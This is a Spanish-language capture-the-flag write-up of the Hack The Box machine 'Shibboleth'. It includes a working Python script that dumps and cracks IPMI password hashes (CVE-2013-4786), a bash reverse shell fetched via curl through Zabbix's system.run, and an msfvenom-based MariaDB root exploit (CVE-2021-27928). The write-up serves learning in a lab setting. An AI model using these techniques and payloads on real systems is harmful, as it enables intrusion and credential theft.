---
title: Hackthebox Writeup Shibboleth
date: 2022-02-24 20:25:45 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Medium, UDP, Sabbix, CVE-2013-4786, msfvenom, RDBMS, MariaDB, CVE-2021-27928, Python Scripting]

img_path: /assets/img/htb/writeups/shibboleth/
---

Empezamos enumerando por el protocolo **TCP** y por detrás del servidor web solo encontramos un sistema de monitorización de redes **Sabbix**. Enumerando por el protocolo **UDP** y por medio de un script básico para reconocimiento de nmap **ipmi-cipher-zero** logramos comprobar que el servicio que corre por ese puerto tiene una vulnerabilidad que nos permite extraer contraseñas hash de usuarios **(CVE-2013-4786)** y crackearlos por fuerza bruta. Ya dentro del sistema sabbix como administrador, logramos por medio de un item crear una key para aplicar **Remote Code Execution (RCE)** y obtener un shell. Para la escalada encontramos credenciales de base de datos en un archivo de configuración de sabbix, luego gracias a poseer una versión desactualizada del **Relational database management system (RDBMS) MariaDB** podemos crear un payload con **msfvenom** para asignarla a una variable vulnerable del gestor de base de datos que se ejecuta como root **(CVE-2021-27928)** y así obtener la shell privilegiada. 

* * *

![Shibboleth](logo.png)

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.124 |  13 Nov 2021 |   Medium   |   30   |

* * *

Antes de empezar la máquina verificamos si tenemos conexión con ella, para ello usamos el comando `ping`:

![Ping](ping.png){: .shadow }

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

> Sistema Operativo por aprox. del **TTL (Time To Live)** : _`64 -> Linux | 128 -> Windows`_
{: .prompt-tip }

## Enumeration

* * *

Empezamos escanenado puertos **TCP** abiertos con la herramienta `nmap`:

![Nmap](open_ports_tcp.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info}

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> \-\-open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -v : Imprimir información del proceso del escaneo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -oG \<file\> : Guardar output en un archivo (\<file\>) de formato _grepable_

Observamos que la máquina solo tiene el puerto **80 (http)** abierto, así que procedemos a escanearlo a profundidad:

![Target](target_tcp.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info}

> -p\<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap 

No disponemos de mucha información, pero como es un servicio http procedemos a ejecutar `whatweb` para ver un poco mas de información y en pararelo abrirla en el navegador:

![WW](whatweb.png){: .shadow }

Obervamos un código de estado _HTTP 302 Moved Temporally_ que realiza lo siguiente:

![302](code_302.png){: .shadow }

En nuestro caso la locación de `/temp-doc` es `shibboleth.htb`:

![HTTP](web.png){: .shadow }

Teniendo en cuenta el **dominio** encontrado (Virtual Hosting), procedemos a agregarlo nuestro archivo `/etc/hosts`: `echo "10.10.11.124 shibboleth.htb" >> /etc/hosts`

Ahora podemos utilizar un script de nmap `--script http-enum` para buscar directorios básicos antes de tirar con `gobuster dir`. Pero desde ya te digo que no encontraremos nada interesante y que sea de ayuda.

Por ello, empezamos con un escaneo de subdominios con `gobuster vhost`:

![Subdomains](subdomains.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info}

> -u \<url\> : Especificar objetivo URL
>
> -w \<wordlist\> : Especificar \<wordlist\> para el escaneo de subdominios
>
> -r : Aplicar redireccionamiento _(302\_code)_

Aplicando lo mismo de antes con estos **subdominios** : `echo "10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb" >> /etc/hosts`

También nos podemos dar cuenta que los 3 tienen el mismo tamaño, lo cúal conlleva a que pueden ser lo mismo, y sí, estamos en lo correcto:

![Zabbix](zabbix_login.png){: .shadow }

Primero debemos saber que es `Zabbix`, y al buscar encontramos que es un **_Sistema de Monitorización de Redes creado por Alexei Vladishev_**

Toqueteando el panel de logeo, nos damos cuenta que hay una referencia a la documentación de `Zabbix 5.0`, y al entrar observamos que no es la versión actual `Zabbix 6.0`. Entonces es probable que existan vulnerabilidades, pero después de buscar un buen tiempo no encontramos nada que nos sirva

En esta situación procedemos a buscar puertos abiertos por el protocolo **UDP**:

![UDP](open_ports_udp.png){: .shadow}

> Explicación de parámetros :
{: .prompt-info}

> \-\-open : Escanear solo puertos abiertos
>
> -sU : Escaneo por el protocolo **UDP**
>
> \-\-min\-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo
>
> -n : No aplicar descubrimiento de hosts

Encontramos el puerto **623 (asf-rmcp)** y buscando en internet encontramos que es un _Protocolo de gestión remota_. Además existe el servicio **Intelligent Platform Management Interface (IPMI)** que tiene varios vectores de ataque

Para comprobar si es vulnerable podemos usar `metasploit` o un script de **nmap** `ipmi-cipher-zero`, puede encontrar mas información el la biblia de los hackers: [Hacktricks](https://book.hacktricks.xyz/pentesting/623-udp-ipmi)

En mi caso usaré el script de `nmap`:

![IPMI](ipmi_cipher_zero.png){: .shadow }

> Explicacíon de parámetros :
{: .prompt-info}

> -sU : Escaneo por el protocolo **UDP**
>
> \-\-script \<script\_name\> : Aplicar un script en específico de nmap
>
> -p \<port\> : Expecificar puerto a escanear

## Foothold

* * *

Observamos que es vulnerable el servicio **Intelligent Platform Management Interface IPMI 2.0** y para ello existe una vulnerabilidad que nos permite autenticarnos con cualquier usuario y extraer contraseñas hash de usuarios **_(CVE-2013-4786)_**

Para ello podemos usar `metasploit` pero a manera de prácticar hice un script en `python` con algunas referencias para conseguir un usuario existente, extraer su **token** y crackearlo con `john`:

```python
#!/usr/bin/python3

import signal, sys, os, time, nmap, pdb, shlex, subprocess, re
from colorama import Fore, init

# reset to dafault color
init(autoreset=True)

# colors
red, yellow, magenta, green = Fore.RED, Fore.YELLOW, Fore.MAGENTA, Fore.GREEN 

# help
def help_panel():
    print(f"\n{magenta}[*] Use : {yellow}{sys.argv[0]} <target> <password_wordlist>")
    sys.exit()

if len(sys.argv) != 3: help_panel() 

def signal_handler(signum, frame):
    print("\nSignum : {} , Frame : {}".format(signum, frame))
    print("\n{red}[!] Exiting...")
    exit(1)

#ctrl + c
signal.signal(signal.SIGINT, signal_handler)

# check connection
def checkConnection(target, port):
    print(f"\n{yellow}[+] Checking if port {magenta}{port} {yellow}is open...")
    time.sleep(2)
    scanning = nmap.PortScanner()
    result = scanning.scan(target, port, arguments='-sU')
    if result['scan'] == {} or result['scan'][target]['udp'][int(port)]['state'] == 'closed':
        print(f"\n{red}[-] Port {magenta}{port} {red}is closed!")
        sys.exit()

# check parameters
def checkParameters(target, port, user, wordlist):
    print(f"\n{yellow}[+] Using a list of {magenta}users {yellow}by default...")
    time.sleep(1)
    if wordlist:
        if not os.path.isfile(wordlist):
            print(f"\n{red}[!] The password wordlist {magenta}{wordlist} {red}is invalid ***")
            sys.exit()

# extract user hash
def getUserHash(target, port, user):
    i = 0
    for u in user:
        output = subprocess.run(shlex.split(f"ipmitool -I lanplus -H {target} -U {u} -P password -vvv 2>&1"), capture_output=True)
        stderr, stdout = output.stderr.decode(), output.stdout.decode()
    
        if 'illegal parameter' in stderr or 'unauthorized name' in stderr:
            print(f"{red}[!] Wrong username {magenta}{u} {red}***")
            i+=1
            pass
        else:
            print(f"\n{yellow}[+] The username {magenta}{u} {yellow}is {green}valid{yellow}...")
            time.sleep(2)
            break
        
        if 'insuficient resources for session' in stderr: 
            print(f"\n{red}[!] Insuficient resources for session! ***"); sys.exit()
   
    user = user[i]
    # extract data to salt
    data = re.findall(r"rakp2 mac input buffer \(.*\)\s+(?: .*?\n)+\>\> rakp2 mac key", stderr)[0]
    data = re.sub(f"rakp2 mac input buffer \(.*\)\n", "", data).replace("\n>> rakp2 mac key", "").replace("\n", "").split(" ")
    salt = ''.join(data)

    # extract hash
    user_hash = re.findall(r"Key exchange auth code \[sha1\] : (.*?)\n?$", stdout)[0].replace("0x", "")
    final_hash = f"$rakp${salt}${user_hash}"
    
    print(f"\n{yellow}[+] The hash for user {magenta}{user}: {green}{final_hash}")
    # load hash
    hash_file = 'hash'
    with open(hash_file, "w") as f:
        f.write(f"{target} {user}:{final_hash}")
        f.close
    return hash_file

# cracking hash with jhon
def cracking(wordlist, hash_file):
    time.sleep(2)
    print(f"\n{yellow}[+] Cracking hash with {magenta}John {yellow}tool...")
    time.sleep(2)
    subprocess.run(shlex.split(f"john --wordlist={wordlist} \"{hash_file}\""))

def run():
    if os.getuid() != 0:
        print("\n[*]{yellow} You must be {red}root {yellow}to run the script!")
        sys.exit() 
    # asign variables
    target = sys.argv[1]
    port = 623
    user = ["ADMIN", "admin", "Administrator", "root", "USERID", "guest", "Admin"]
    wordlist = sys.argv[2]

    checkConnection(target, str(port))
    checkParameters(target, port, user, wordlist)
    
    if user:
        hash_file = getUserHash(target, port, user)
        cracking(wordlist, hash_file)

# main
if __name__ == '__main__':
    run()
```

> No olvide instalar antes los requerimientos para el script :
{: .prompt-warning}

```bash
#!/bin/bash

# valdiate user to run
if [ "$(id -u)" -ne 0 ]; then
	echo "\n[*] You must be root to run the script!"
	exit
fi

# ctrl + c
function ctrl_c(){
	tput cnorm
	echo -e "\n[-] Exiting..."
	exit
}

trap ctrl_c SIGINT

#requirements
tput civis
echo -ne "\n[+] Installing requirements:\n"
apt-get install ipmitool nmap python3-pip -y
echo -ne "\n[+] Installing python3 requirements:\n"
pip install colorama python-nmap
echo -ne "\n\n[*] All requirements have been installed\n"; tput cnorm
```

![EXPLOIT](exploit_hash_admin.png){: .shadow }

Pueden encontrar los archivos del script en mi repositorio: [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/CVE-2013-4786_Shibboleth)

Ahora nos logemos con las credenciales obtenidas y nos encontramos con el panel de administración de `Zabbix`:

![Panel\_Admin](zabbix_administrator_panel.png){: .shadow }

Revisando la documentación de la versión encontramos que podemos añadir **_items_** al host que estamos monitoreando `shibboleth.htb`, y buscando para que sirven encontramos algo interesante:

![Items\_Zabbix](items_mean.png){: .shadow }

Para extraer cierta información se hace uso de una _key_, la cuál es como un nombre de una función en particular que podemos usar. Al igual que esta hay otras más que vienen pre-definidas en el agente `Zabbix`: [Pre-defined keys](https://www.zabbix.com/documentation/5.0/en/manual/config/items/itemtypes/zabbix_agent)

Buscamos una que nos ayuder a ejecutar comandos para tener una brecha de una _**reverse shell**_ y entrar al sistema, al final logramos encontrarla:

![Item\_system\_run](system_run_item.png){: .shadow }

Ahora que sabemos que podemos ejecutar comandos en el host, procedemos a aplicar la _reverse\_shell_:

> Reverse shell con **curl** :
{: .prompt-info}

> Creamos un archivo _index.html_ con una reverse en `bash`:

```html
#!/bin/bash
 
bash -i >& /dev/tcp/{nuestra\_IP}/{puerto} 0>&1
```

> Con `python3` y en el mismo directorio compartimos un **servidor http** : `python3 -m http.server 80`

> En paralelo con `nc` nos ponemos en escucha para recibir la shell: `nc -lvp {puerto}`

> Nos dirigimos al apartado para agregar un **_item_ (Configuration -\> Hosts -\> items -\> Create item)** y agregamos un nombre cualquiera y en el apartado del agente seleccionas la key _system.run[command, \<mode\>]_ pero de la siguiente manera: `system.run[curl http://{nuestra_IP} | bash, nowait]`

![System\_run](system_run_key.png){: .shadow}

> Presionamos el botón `_Test_`, luego `_Get value_` y recibiremos la shell como **zabbix**:

![Foothold](foothold.png){: .shadow }

Ahora para manejarnos mejor por consola hacemos un tratamiento rápido de la **TTY**:

![TTY](stty_1.png){: .shadow }
![TTY](stty_2.png){: .shadow }

Buscamos que usuarios existen, intentamos ver la **flag** pero necesitamos ser el usuario **_ipmi\-svc_**, probamos reusar las credenciales del login de `Zabbix` y pa-dentro:

![FLAG](flag.png){: .shadow }

## Privilege Escalation

* * *

Como el usuario _ipmi\-svc_ intentamos listar **binarios con permisos SUID** `find \-perm -4000 2>/dev/null` y **binarios que podamos ejecutar como root** `sudo -l`, pero no encontramos nada interesante

Sabemos que tenemos un agente `Zabbix`, así que intentamos buscar archivos de configuración de podemos leer y conseguimos unas credenciales de una base de dat
os:  

![DB\_ZABBIX](db_zabbix_credentials.png){: .shadow }

También podemos hacer uso de _LinPEAS_ que nos permite encontrar posibles rutas para escalar privilegios: [LinPEAS](https://github.com/carlospolop/PEASS-ng/tr
ee/master/linPEAS)

Ingresamos con las credenciales, intentamos buscar información que nos sirva pero no encontramos nada. Pero al observar la versión del **_Sistema de gestión de bases de datos relacionales (RDBMS)_** `MariaDB 10.3.25` y buscando en internet que la versión actual es `MariaDB 10.7.3` nos da la sensasión que puede ser vulnerable:

![MariaDB](mariadb_version.png){: .shadow }

Buscando en internet encontramos una vulnerabilidad en la cuál la variable `wsrep_provider` pueden ser modificadas en tiempo de ejecución por el usuario de la base de datos `zabbix` pero con privilegios de SUPER usuario y con ello facilmente obtener una shell como **root _(CVE-2021-27928)_**:

> CVE-2021-27928

* 1\. Creamos un **payload malicioso** (reverse shell) con `msfvenom`

![MSFVENOM\_REV](msfvenom_payload.png){: .shadow }

> Explicación de parámetros :
{: .prompt-info}

> -p \<payload\> : Especificar el payload a crear de acuerdo a tus requerimientos
>
> LHOST=\<host\> : Asignar el host que recibirá la reverse shell
>
> LPORT=\<port\> : Asignar el puero por el cuál recibiremos la reverse shell
>
> -f \<format\> : Formato del output del payload
>
> -o \<file\_name\> : Guardar el payload en un archivo

* 2\. Compartimos el **payload** a la **máquina víctima** (10.10.11.124) en un directorio con permisos (/tmp)

* 3\. En **nuestra máquina** nos ponemos en escucha por el puerto especificado en el **payload**

* 4\. Entramos a la base de datos con el usuario `zabbix` pero agregamos el parámetro `-e` para ejecutar comandos, asignar a la variable `wsrep_provides` nuestro **payload malicioso**, y ya que lo ejecutamos como SUPER usuario, recibir la shell en nuestra máquina y con ello ser root y pa-dentro:

![ROOT](root.png){: .shadow }

* * *

